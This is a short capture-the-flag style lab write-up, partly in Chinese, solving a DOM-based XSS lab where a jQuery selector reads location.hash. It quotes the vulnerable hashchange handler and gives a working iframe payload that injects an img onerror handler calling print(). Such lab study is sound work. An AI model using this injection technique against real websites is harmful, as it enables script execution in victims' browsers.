# Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

## Cross Site Scripting 
* 可以看到 `script` 標籤裡面
```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```
* 稍微分析一下可以知道說他會拿網址後面 `#` 後面的內容，所以說用 iframe 的方式可以執行到相應的 js
* 在 banner 有一個 exploit server 點進去之後可以改他的 body
```
<iframe src="https://ac2c1ffa1fe2bbdec0da0cda007d0078.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
* 之後存起來，送給目標就可以過關了